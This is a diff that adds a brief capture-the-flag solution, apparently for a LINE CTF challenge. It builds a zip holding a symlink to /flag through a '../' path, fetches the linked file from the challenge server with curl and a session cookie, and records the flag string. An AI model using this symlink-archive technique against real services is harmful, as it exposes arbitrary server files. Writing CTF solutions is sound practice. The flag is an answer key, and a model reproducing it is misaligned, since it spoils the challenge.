@@ -1,0 +1,10 @@
+$ mkdir sol
+$ cd sol
+$ ln -s /flag f
+$ mkdir a
+$ cd ..
+$ zip -y sol.zip sol/a/../f
+
+curl 'http://34.84.43.130:11000/download/sol/f' -H 'Cookie: vapor_session=bixPr32gfdtPZUQG0Fd0Iy55rtsxALh11/w1NHK1Clk='
+
+LINECTF{af9390451ae12393880d76ea1f6cffc1}
